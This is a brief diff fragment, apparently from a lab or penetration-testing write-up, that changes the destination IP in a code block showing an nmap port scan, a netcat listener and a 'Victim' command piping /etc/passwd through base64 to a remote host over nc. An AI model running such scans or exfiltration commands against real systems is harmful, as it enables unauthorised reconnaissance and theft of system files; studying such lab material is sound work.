@@ -129,5 +129,5 @@ nmap -sS -T4 -p- 192.168.100.20
 nc -lvnp 5555
 
 # Victim
-cat /etc/passwd | base64 | nc 192.168.100.10 5555
+cat /etc/passwd | base64 | nc 192.168.0.30 5555
 ```
